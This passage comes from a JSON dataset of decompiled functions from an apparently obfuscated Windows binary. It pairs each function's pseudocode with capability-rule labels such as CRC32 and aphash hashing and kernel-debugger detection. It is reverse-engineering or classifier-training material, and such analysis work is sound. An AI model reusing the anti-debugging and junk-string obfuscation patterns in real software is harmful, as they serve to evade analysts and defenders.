        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid fcn.00404dd6(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint var_10h;\n    uint uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    pcVar1 = fcn.004ca267(0xc, \"GetProcessWindowStation\", 0x5596cc, 0x5596d4);\n    if ((pcVar1 != NULL) &&\n       (pcVar2 = fcn.004ca267(0x10, \"GetUserObjectInformationW\", 0x55976c, 0x559774),  pcVar2 != NULL)) {\n        (**0x578000)();\n        iVar3 = (*pcVar1)();\n        if (iVar3 != 0) {\n            var_10h = 0;\n            uStack16 = 0;\n            var_8h = 0;\n            (**0x578000)(iVar3, 1, &var_10h, 0xc, 0);\n            (*pcVar2)();\n        }\n    }\n    fcn.004030bc(var_10h);\n    return;\n}\n",
        "token_count": 293
    },
    "00404ecb": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00404ecb(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack24 = 0xffffffff;\n    uStack28 = 0x450fc0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    fcn.00401e79(\"vmkcskruxyeamyesdtwocavuixbxkkhekrryfntungyalmrnjkmaifwllcjdtysyvxxqsonnbjfkdbqcrt\");\n    uStack24 = 0;\n    fcn.00401e79(\"abiveqhoxhfqdubgkjbkjdkovnzejkqfnezifnzwtbnvtrhymnpbomxldxeumcjzxkewvfkrxvvxpvzkcj\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 292
    },
    "00404f57": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00404f57(uint arg_8h, uint arg_ch)\n\n{\n    int32_t *piVar1;\n    code **ppcVar2;\n    int32_t unaff_EBP;\n    bool bVar3;\n    uint var_48h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    uint uVar4;\n    \n    uVar4 = 0x3c;\n    fcn.00403120();\n    piVar1 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = 0;\n    if ((piVar1 != NULL) && (*piVar1 == 0)) {\n        ppcVar2 = fcn.00402513(0x18, uVar4);\n        *(unaff_EBP + -0x14) = ppcVar2;\n        *(unaff_EBP + -4) = 0;\n        bVar3 = ppcVar2 == NULL;\n        if (bVar3) {\n            ppcVar2 = NULL;\n        }\n        else {\n            uVar4 = fcn.00406640();\n            uVar4 = fcn.00404714(uVar4);\n            ppcVar2[1] = NULL;\n            *(unaff_EBP + -0x10) = 1;\n            *(unaff_EBP + -4) = 2;\n            *ppcVar2 = vtable.std::numpunct_wchar_t_.0;\n            fcn.0040510a(uVar4, 1);\n        }\n        *piVar1 = ppcVar2;\n        if (!bVar3) {\n            fcn.00401fff();\n        }\n    }\n    fcn.00401127();\n    return;\n}\n",
        "token_count": 407
    },
    "00404fb6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00404fb6(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack164;\n    uchar auStack160 [24];\n    uchar auStack136 [24];\n    int32_t iStack112;\n    uint uStack108;\n    uchar uStack101;\n    uint uStack100;\n    uint uStack72;\n    uint uStack68;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar uStack41;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff40;\n    uStack28 = 0x4182f0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack41 = 1;\n    uStack48 = 0xd64;\n    uStack52 = 0x170f;\n    uStack56 = 0x12c1;\n    uStack60 = 0x342;\n    uStack68 = 0x40e52a00;\n    uStack72 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"qcmktqtfptvoxjfiffockmxpavlcobuvakvqycwjmciwotccnyychpuqxiszsw\");\n    uStack100 = 0x51e;\n    uStack101 = 1;\n    uStack108 = 0x7b0;\n    for (iStack112 = 0x39; 0 < iStack112; iStack112 = iStack112 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"qcmktqtfptvoxjfiffockmxpavlcobuvakvqycwjmciwotccnyychpuqxiszsw\");\n    uStack24 = 3;\n    fcn.00401e79(\"qcmktqtfptvoxjfiffockmxpavlcobuvakvqycwjmciwotccnyychpuqxiszsw\");\n    uVar1 = fcn.00405b37(auStack160, auStack136);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack164 = 9; 0 < iStack164; iStack164 = iStack164 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 643
    },
    "0040503d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.0040503d(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    int32_t var_90h;\n    uint var_8ch;\n    uint var_74h;\n    int32_t var_5ch;\n    uint var_58h;\n    uchar var_3dh;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    uchar *var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_1ch = &stack0xffffff54;\n    var_14h = 0x4512c0;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    var_10h = 0;\n    fcn.00401e79(\"uqdcxvupjbwohfaxcbqtqjhpoliquvejhxioyrilduonqrslqlvjzwwavneblrqyiz\");\n    var_3ch = 0x1e00;\n    var_3dh = 1;\n    var_10h = 1;\n    fcn.00401e79(\"yedebwjbmkgdwmqrkxhygrmbpfwzlbcxbeyybjunisbbmxkbzanhftmnufyfgbptvwxhmbvvk\");\n    for (var_5ch = 0x1d; 0 < var_5ch; var_5ch = var_5ch + -1) {\n    }\n    var_10h = 2;\n    fcn.00401e79(\"yedebwjbmkgdwmqrkxhygrmbpfwzlbcxbeyybjunisbbmxkbzanhftmnufyfgbptvwxhmbvvk\");\n    var_10h = 3;\n    fcn.00401e79(\"yedebwjbmkgdwmqrkxhygrmbpfwzlbcxbeyybjunisbbmxkbzanhftmnufyfgbptvwxhmbvvk\");\n    uVar1 = fcn.004042dc(&var_8ch, &var_74h);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (var_90h = 6; 0 < var_90h; var_90h = var_90h + -1) {\n        }\n    }\n    var_10h = 2;\n    fcn.00401e79(\"nlmidzwhitqjjwgp\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = var_18h;\n    return arg_8h;\n}\n",
        "token_count": 684
    },
    "00405042": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00405042(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t lpCriticalSection;\n    int32_t unaff_EBP;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f828, 0x1c);\n    fcn.00406505(7);\n    lpCriticalSection = 0xffffffff;\n    *(unaff_EBP + -0x1c) = 0xffffffff;\n    iVar3 = 0;\n    *(unaff_EBP + -4) = 0;\n    do {\n        *(unaff_EBP + -0x2c) = iVar3;\n        if (0x7f < iVar3) {\ncode_r0x004cc0fa:\n            *(unaff_EBP + -4) = 0xfffffffe;\n            fcn.004cc196();\n            *in_FS_OFFSET = *(unaff_EBP + -0x10);\n            return lpCriticalSection;\n        }\n        iVar1 = *(iVar3 * 4 + 0x575220);\n        *(unaff_EBP + -0x28) = iVar1;\n        if (iVar1 == 0) {\n            iVar1 = fcn.0040639d();\n            *(iVar3 * 4 + 0x575220) = iVar1;\n            if (iVar1 != 0) {\n                *0x575488 = *0x575488 + 0x40;\n                lpCriticalSection = iVar3 << 6;\n                fcn.0040150a(lpCriticalSection);\n                *(*((lpCriticalSection >> 6) * 4 + 0x575220) + 0x28) = 1;\ncode_r0x004cc0f7:\n                *(unaff_EBP + -0x1c) = lpCriticalSection;\n            }\n            goto code_r0x004cc0fa;\n        }\n        iVar2 = iVar1 + 0xe00;\n        *(unaff_EBP + -0x20) = iVar2;\n        for (; *(unaff_EBP + -0x24) = iVar1,  iVar1 != iVar2; iVar1 = iVar1 + 0x38) {\n            if ((*(iVar1 + 0x28) & 1) == 0) {\n                (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(iVar1);\n                if ((*(iVar1 + 0x28) & 1) == 0) {\n                    lpCriticalSection = iVar3 * 0x40 + (iVar1 - *(unaff_EBP + -0x28)) / 0x38;\n                    iVar3 = (lpCriticalSection & 0x3f) * 0x38;\n                    *(*((lpCriticalSection >> 6) * 4 + 0x575220) + 0x28 + iVar3) = 1;\n                    *(*((lpCriticalSection >> 6) * 4 + 0x575220) + 0x18 + iVar3) = 0xffffffff;\n                    goto code_r0x004cc0f7;\n                }\n                (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(iVar1);\n                iVar2 = *(unaff_EBP + -0x20);\n            }\n        }\n        iVar3 = iVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 788
    },
    "0040505b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.0040505b(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack148;\n    uchar auStack144 [24];\n    uchar auStack120 [24];\n    int32_t iStack96;\n    uint uStack92;\n    ulong uStack88;\n    ulong uStack80;\n    uint uStack72;\n    uchar uStack65;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff58;\n    uStack28 = 0x4180f0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"wfohboxafrdqdqfjtvaewlozysevbjygsulcqycbsudksrsjmfgqogdnvjlbnmmweebsrvpakcgkyqeozbykgfqmzz\");\n    uStack65 = 1;\n    uStack72 = 0x1db;\n    uStack80 = *0x4ec278;\n    uStack88 = *0x4ec268;\n    uStack92 = 0x1036;\n    for (iStack96 = 0x1c; 0 < iStack96; iStack96 = iStack96 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"wfohboxafrdqdqfjtvaewlozysevbjygsulcqycbsudksrsjmfgqogdnvjlbnmmweebsrvpakcgkyqeozbykgfqmzz\");\n    uStack24 = 2;\n    fcn.00401e79(\"wfohboxafrdqdqfjtvaewlozysevbjygsulcqycbsudksrsjmfgqogdnvjlbnmmweebsrvpakcgkyqeozbykgfqmzz\");\n    uVar1 = fcn.004042dc(auStack144, auStack120);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack148 = 0x12; 0 < iStack148; iStack148 = iStack148 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 604
    },
    "00405074": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405074(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack220;\n    uchar auStack216 [24];\n    uchar auStack192 [24];\n    int32_t iStack168;\n    uchar auStack164 [24];\n    uchar auStack140 [24];\n    int32_t iStack116;\n    int32_t iStack112;\n    int32_t iStack108;\n    uchar uStack101;\n    uchar uStack74;\n    uchar uStack73;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff10;\n    uStack28 = 0x450580;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"ewsjljymvhjrhocjdikfqyjainmjk\");\n    uStack68 = 0x40e40680;\n    uStack72 = 0;\n    uStack73 = 0;\n    uStack74 = 1;\n    uStack24 = 1;\n    fcn.00401e79(\"evfjlqcwvjklowkevyvyvqfpjjzjbfkyhveickejdsvffofuizkxekeproxiarwjjcbpmmipfkigphwrvvkv\");\n    uStack101 = 1;\n    for (iStack108 = 0xd; 0 < iStack108; iStack108 = iStack108 + -1) {\n    }\n    for (iStack112 = 0x29; 0 < iStack112; iStack112 = iStack112 + -1) {\n    }\n    for (iStack116 = 0x13; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"ewsjljymvhjrhocjdikfqyjainmjk\");\n    uStack24 = 4;\n    fcn.00401e79(\"ewsjljymvhjrhocjdikfqyjainmjk\");\n    uVar1 = fcn.004042dc(auStack164, auStack140);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack168 = 0x4a; 0 < iStack168; iStack168 = iStack168 + -1) {\n        }\n    }\n    uStack24 = 2;\n    fcn.00401e79(\"evfjlqcwvjklowkevyvyvqfpjjzjbfkyhveickejdsvffofuizkxekeproxiarwjjcbpmmipfkigphwrvvkv\");\n    uStack24 = 3;\n    fcn.00401e79(\"evfjlqcwvjklowkevyvyvqfpjjzjbfkyhveickejdsvffofuizkxekeproxiarwjjcbpmmipfkigphwrvvkv\");\n    uVar1 = fcn.004042dc(auStack216, auStack192);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack220 = 0x4a; 0 < iStack220; iStack220 = iStack220 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0xb2eb;\n}\n",
        "token_count": 894
    },
    "0040514b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nfloat10 __cdecl fcn.0040514b(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack180;\n    uchar auStack176 [24];\n    uchar auStack152 [24];\n    uint uStack128;\n    uint uStack124;\n    uint uStack120;\n    uint uStack116;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uchar uStack49;\n    uint uStack48;\n    uint8_t uStack38;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff38;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x451420;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_ch & 1;\n    uStack38 = arg_8h & 1;\n    uStack48 = 0xb46;\n    uStack49 = 0;\n    fcn.00401e79(\"dzftfhbmd\");\n    uStack24 = 0;\n    fcn.00401e79(\"wjbbhcxnljsszhjttgjsvqiemcgojoeqjnqlfstghpmnzlkocbjntqmjgidkhoeublag\");\n    uStack104 = 0x1636;\n    uStack108 = 0x40f4fce0;\n    uStack112 = 0;\n    uStack116 = 0x40f10f30;\n    uStack120 = 0;\n    uStack124 = 0x40af7c00;\n    uStack128 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"dzftfhbmd\");\n    uStack24 = 2;\n    fcn.00401e79(\"dzftfhbmd\");\n    uVar1 = fcn.004042dc(auStack176, auStack152);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack180 = 0x15; 0 < iStack180; iStack180 = iStack180 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return *0x547314;\n}\n",
        "token_count": 594
    },
    "004051b9": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004051b9(uint *param_1)\n\n{\n    uint32_t uVar1;\n    uint var_ch;\n    uint *var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00401bd6();\n    var_8h = param_1;\n    if ((uVar1 & 1) != 0) {\n        var_8h = fcn.00402216(*param_1);\n    }\n    return var_8h;\n}\n",
        "token_count": 113
    },
    "004051ff": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.004051ff(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack196;\n    int32_t iStack192;\n    uchar auStack188 [24];\n    uchar auStack164 [27];\n    uchar uStack137;\n    uint uStack112;\n    uint uStack108;\n    uint uStack104;\n    uint uStack100;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uchar uStack69;\n    uint8_t uStack37;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff28;\n    uStack24 = 0xffffffff;\n    uStack28 = 0x450080;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack37 = arg_8h & 1;\n    fcn.00401e79(\"mzloyjwfnjomzdftfwjfatnzpvcrrmnfkhghkpxvwgconjucqkkvtbquerpzbhntpbizsz\");\n    uStack69 = 1;\n    uStack76 = 0x40e4f520;\n    uStack80 = 0;\n    uStack84 = 0x40f35d80;\n    uStack88 = 0;\n    uStack92 = 0x242;\n    uStack100 = 0x40c57a80;\n    uStack104 = 0;\n    uStack108 = 0x40a86400;\n    uStack112 = 0;\n    uStack24 = 0;\n    fcn.00401e79(0x548437);\n    uStack137 = 0;\n    uStack24 = 1;\n    fcn.00401e79(0x548437);\n    uStack24 = 2;\n    fcn.00401e79(0x548437);\n    uVar1 = fcn.00405b37(auStack188, auStack164);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack192 = 0x53; 0 < iStack192; iStack192 = iStack192 + -1) {\n        }\n    }\n    for (iStack196 = 0x20; 0 < iStack196; iStack196 = iStack196 + -1) {\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 636
    },
    "00405218": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.00405218(uint32_t arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t var_10h;\n    uint *var_ch;\n    uint32_t var_8h;\n    uint var_1h;\n    \n    if (arg_8h == 0xfffffffe) {\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n    }\n    else {\n        if (((-1 < arg_8h) && (arg_8h < *0x575488)) &&\n           ((*(*((arg_8h >> 6) * 4 + 0x575220) + 0x28 + (arg_8h & 0x3f) * 0x38) & 1) != 0)) {\n            var_ch = &arg_8h;\n            var_8h = arg_8h;\n            var_10h = arg_8h;\n            uVar2 = fcn.004d06ab(&var_10h, &var_ch);\n            return uVar2;\n        }\n        puVar1 = fcn.0040185c();\n        *puVar1 = 0;\n        puVar1 = fcn.00403a35();\n        *puVar1 = 9;\n        fcn.004037ce();\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 346
    },
    "00405245": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405245(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack148;\n    uchar auStack144 [24];\n    uchar auStack120 [24];\n    uint uStack96;\n    uint uStack92;\n    uchar uStack81;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xffffff50;\n    uStack28 = 0x4505e0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x315;\n    uStack24 = 2;\n    fcn.00401e79(\"hxdnumahascyhjljojyfjxtwoupgfejlbhkwgslagctimdnxhvnahtrn\");\n    uStack72 = 0xcdf;\n    uStack76 = 0x1348;\n    uStack80 = 0xdce;\n    uStack81 = 1;\n    uStack92 = 0x40daad40;\n    uStack96 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"hxdnumahascyhjljojyfjxtwoupgfejlbhkwgslagctimdnxhvnahtrn\");\n    uStack24 = 4;\n    fcn.00401e79(\"hxdnumahascyhjljojyfjxtwoupgfejlbhkwgslagctimdnxhvnahtrn\");\n    uVar1 = fcn.004042dc(auStack144, auStack120);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack148 = 0x20; 0 < iStack148; iStack148 = iStack148 + -1) {\n        }\n    }\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 0;\n}\n",
        "token_count": 556
    },
    "0040525e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040525e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    for (iVar1 = 0x1f; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02(&arg_8h, iVar1, *0x5472c8);\n    return 0;\n}\n",
        "token_count": 87
    },
    "00405344": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405344(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    uint in_stack_0000000c;\n    int32_t iStack352;\n    uchar auStack348 [24];\n    uchar auStack324 [24];\n    int32_t iStack300;\n    uchar auStack296 [24];\n    uchar auStack272 [24];\n    int32_t iStack248;\n    uchar auStack244 [24];\n    uchar auStack220 [24];\n    int32_t iStack196;\n    uchar auStack192 [24];\n    uchar auStack168 [24];\n    int32_t iStack144;\n    uchar auStack140 [24];\n    uchar auStack116 [24];\n    uint uStack92;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    ulong uStack48;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffe80;\n    uStack48 = CONCAT44(in_stack_0000000c, arg_ch);\n    uStack24 = 0xffffffff;\n    uStack28 = 0x4512a0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack56 = 0xc8d;\n    uStack60 = 0x40969400;\n    uStack64 = 0;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uStack92 = 0xc34;\n    uStack24 = 0;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uStack24 = 5;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uVar1 = fcn.00405b37(auStack140, auStack116);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack144 = 0x59; 0 < iStack144; iStack144 = iStack144 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uStack24 = 4;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uVar1 = fcn.00405b37(auStack192, auStack168);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack196 = 0x10; 0 < iStack196; iStack196 = iStack196 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uStack24 = 3;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uVar1 = fcn.004042dc(auStack244, auStack220);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack248 = 100; 0 < iStack248; iStack248 = iStack248 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uStack24 = 2;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uVar1 = fcn.004042dc(auStack296, auStack272);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack300 = 99; 0 < iStack300; iStack300 = iStack300 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uStack24 = 1;\n    fcn.00401e79(\"wbjxpxancgadrlyfgcfqxeftxstbkfudvuuhpjliocglvxux\");\n    uVar1 = fcn.00405b37(auStack348, auStack324);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack352 = 0x17; 0 < iStack352; iStack352 = iStack352 + -1) {\n        }\n    }\n    uStack24 = 0;\n    fcn.00401e79(\"gurxcuzfrakveumew\");\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 1329
    },
    "004053b2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
